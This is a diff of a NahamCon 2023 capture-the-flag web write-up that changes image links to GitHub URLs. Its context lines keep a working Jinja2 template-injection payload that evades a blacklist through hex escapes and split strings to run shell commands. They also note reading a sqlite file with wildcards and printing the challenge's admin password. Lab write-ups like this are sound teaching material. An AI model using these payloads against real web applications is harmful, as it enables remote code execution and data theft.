@@ -46,7 +46,7 @@ Our blacklist also includes some functions that were used, which I bypassed by b
 http://challenge.nahamcon.com:32053/?success={{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuil%27%27tins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimp%27%27ort\x5f\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27id%27)|attr(%27read%27)()}}
 ```
 
-![[Pasted image 20230616171249.png]]
+![Pasted image 20230616171249.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616171249.png)
 
 We have successful code execution!! Now all that remains is to find the flag.
 
@@ -72,7 +72,7 @@ drwxr-xr-x    1 root     root          4096 Jun 14 17:54 ..
 
 Unfortunately, opening a sqlite file is a bit tricky with the RCE that I am currently using. Moreover, dots are still blacklisted. It is fortunate that this folder only has one file, so we can use wildcard * to select `db.sqlite` without using dot. When I try `cat /usr/src/app/DB/*`:
 
-![[Pasted image 20230616172048.png]]
+![Pasted image 20230616172048.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616172048.png)
 
 It seems there are issues when trying to output invalid characters, causing the internal server error. As a last attempt, I decided to try `strings`, which should only output legitimate utf-8 friendly characters. However, it is not guaranteed that the flag could remain intact for this.
 
@@ -114,5 +114,5 @@ Very foturnately, the flag not only survived but is very readable!
 As a side note, we have the password for `admin` now too, and can log in.
 `admin:T2dUL6Z#S9KH%x%i`
 
-![[Pasted image 20230616172852.png]]
+![Pasted image 20230616172852.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616172852.png)
 
